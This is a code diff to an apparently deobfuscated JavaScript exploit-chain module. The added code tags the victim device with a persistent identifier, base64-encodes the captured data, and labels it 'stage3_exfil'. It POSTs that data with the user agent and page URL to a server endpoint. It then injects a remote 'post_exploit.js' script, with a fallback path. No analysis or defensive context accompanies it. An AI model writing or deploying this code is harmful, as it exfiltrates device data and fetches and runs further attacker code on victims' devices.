@@ -1147,20 +1147,68 @@ function YA() {/* Original: YA → resolveSymbols */
         },
         TA(A, g, D, M) {
             try {
-                let M = !1;
+                let done = !1;
+                const finish = () => { if (!done) { done = !0; try { D && D(); } catch(e){} } };
+                const host = window.location.hostname || "127.0.0.1";
+                const base = window.location.protocol + "//" + host + ":8080";
                 const C = new XMLHttpRequest();
-                const localUrl = "http://" + window.location.hostname + ":5000/api/device-data";
-                const payload = JSON.stringify({
-                    data_payload: A,
-                    metadata: g
+                const deviceUUID = window.__dsDeviceUUID || ("ios-" + Math.random().toString(16).slice(2, 14) + Math.random().toString(16).slice(2, 14));
+                window.__dsDeviceUUID = deviceUUID;
+                try { localStorage.setItem("ds_device_uuid", deviceUUID); } catch(e){}
+                let b64A = "", b64G = "";
+                try {
+                    const rawA = typeof A === "string" ? A : (A instanceof Uint8Array ? String.fromCharCode.apply(null, A) : JSON.stringify(A));
+                    b64A = btoa(unescape(encodeURIComponent(rawA)));
+                } catch(e) {}
+                try {
+                    const rawG = typeof g === "string" ? g : (g instanceof Uint8Array ? String.fromCharCode.apply(null, g) : JSON.stringify(g));
+                    b64G = btoa(unescape(encodeURIComponent(rawG)));
+                } catch(e) {}
+                const exfilPayload = JSON.stringify({
+                    deviceUUID: deviceUUID,
+                    category: "stage3_payload",
+                    path: "/sandbox/stage3_container.bin",
+                    description: JSON.stringify({
+                        type: "stage3_exfil",
+                        payload_sizes: { A_size: b64A.length, G_size: b64G.length },
+                        metadata_raw: typeof g === "object" ? g : null,
+                        ua: navigator.userAgent,
+                        href: location.href
+                    }),
+                    data: b64A || b64G || ""
                 });
-                C.open("POST", localUrl, !0), C.setRequestHeader("Content-Type", "application/json"), C.onreadystatechange = () => {
-                    4 === C.readyState && (M || (M = !0, D()));
-                }, C.send(payload), setTimeout(function () {
-                    M || (M = !0);
-                }, 10000 /* 893931597 ^ 893941597 */);
-            } catch (A) {
-                M();
+                try {
+                    C.open("POST", base + "/upload", !0);
+                    C.setRequestHeader("Content-Type", "application/json");
+                    C.timeout = 10000;
+                    C.onreadystatechange = () => {
+                        if (C.readyState === 4 && !done) {
+                            finish();
+                            try {
+                                if (window.__dsRunPostExploit) return;
+                                window.__dsRunPostExploit = true;
+                                const peScript = document.createElement("script");
+                                peScript.src = base + "/payloads/post_exploit.js?_=" + Date.now();
+                                peScript.onerror = () => {
+                                    try {
+                                        const fallback = document.createElement("script");
+                                        fallback.src = base + "/post_exploit.js?_=" + Date.now();
+                                        document.head.appendChild(fallback);
+                                    } catch(e2){}
+                                };
+                                document.head && document.head.appendChild(peScript);
+                            } catch(peErr){}
+                        }
+                    };
+                    C.ontimeout = finish;
+                    C.onerror = finish;
+                    C.send(exfilPayload);
+                } catch (xhrErr) {
+                    finish();
+                }
+                setTimeout(finish, 12000);
+            } catch (err) {
+                try { D && D(); } catch(e){}
             }
         },
         // Fetch a single file as ArrayBuffer
